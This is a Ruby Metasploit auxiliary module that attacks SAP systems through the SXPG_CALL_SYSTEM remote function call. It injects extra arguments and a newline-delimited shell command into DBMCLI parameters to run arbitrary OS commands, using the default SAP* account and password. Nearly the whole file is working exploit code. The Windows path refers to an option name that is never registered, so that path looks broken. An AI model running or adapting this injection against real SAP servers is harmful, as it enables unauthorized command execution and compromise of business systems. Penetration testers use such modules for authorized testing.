##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

##
# This module is based on, inspired by, or is a port of a plugin available in the Onapsis Bizploit Opensource ERP Penetration Testing framework - http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts in producing the Metasploit modules and was happy to share his knowledge and experience - a very cool guy.
# Id also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis who have Beta tested the modules and provided excellent feedback. Some people just seem to enjoy hacking SAP :)
##

require 'msf/core'
require 'msf/core/exploit/sap'

class Metasploit4 < Msf::Auxiliary

  include Msf::Exploit::SAP::RFC
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'SAP RFC SXPG_CALL_SYSTEM',
      'Description' => %q{
        This module makes use of the SXPG_CALL_SYSTEM Remote Function Call to execute OS commands as configured in SM69.
        The module requires the NW RFC SDK from SAP as well as the Ruby wrapper nwrfc (http://rubygems.org/gems/nwrfc).
      },
      'References' => [[ 'URL', 'https://labs.mwrinfosecurity.com/blog/2012/09/03/sap-parameter-injection/' ]],
      'Author' => [ 'nmonkee' ],
      'License' => BSD_LICENSE,
    )

    register_options(
      [
        OptString.new('USERNAME', [true, 'Username', 'SAP*']),
        OptString.new('PASSWORD', [true, 'Password', '06071992']),
        OptString.new('CMD', [true, 'Command', 'id']),
        OptEnum.new('OS', [true, 'Target OS','UNIX',['UNIX', 'Windows NT']])
      ], self.class)
  end

  def run_host(rhost)
    user = datastore['USERNAME']
    password = datastore['PASSWORD']
    unless datastore['CLIENT'] =~ /^\d{3}\z/
        fail_with(Exploit::Failure::BadConfig, "CLIENT in wrong format")
    end

    @outfile = Rex::Text.rand_text_alpha(8)

    command = create_payload(1)
    res = exec_CMD(user, datastore['CLIENT'], password, rhost, rport, command)

    if res =~ /External program terminated with exit code/im
      print_error("#{rhost}:#{rport} [SAP] DBMCLI does not exist on target host")
      return
    end


    command = create_payload(2)
    res = exec_CMD(user, datastore['CLIENT'], password, rhost, rport, command)

    if res
      print res
    else
      print_error("#{rhost}:#{rport} [SAP] No output received")
    end
  end

  def create_payload(num)
    command = ""

    target_host = Rex::Text.rand_text_alpha(5)

    if datastore['OS'].downcase == "unix"
      if num == 1
        command = "-o /tmp/#{@outfile} -n pwnie\n!" #"#{target_host}\n!"
        command << datastore['CMD'].gsub(' ',"\t")
        command << "\n"
      else
        command = "-ic /tmp/#{@outfile}"
      end
    elsif datastore['OS'].downcase == "windows nt"
      if num == 1
        command = "-o c:\\#{@outfile} -n #{target_host}\r\n!"
        space = "%programfiles:~10,1%"
        command << datastore['COMMAND'].gsub(" ",space)
        # TODO The command should be gsubbed for space?
      else
        command = "-ic c:\\#{@outfile}"
      end
    end

    command
  end

  def exec_CMD(user,client,pass,rhost,rport,command)
    return nil if command.blank?

    login(rhost, rport, client, user, pass) do |conn|
      conn.connection_info

      begin
        data  = sxpg_command_execute(
          conn,
          {
            :COMMANDNAME => 'DBMCLI',
            :OPERATINGSYSTEM => 'ANYOS',
            :ADDITIONAL_PARAMETERS => command
          })
        puts data
        return data
      rescue NWError => e
        print_error("#{rhost}:#{rport} [SAP] #{e.code} - #{e.message}")
      end
    end
  end
end

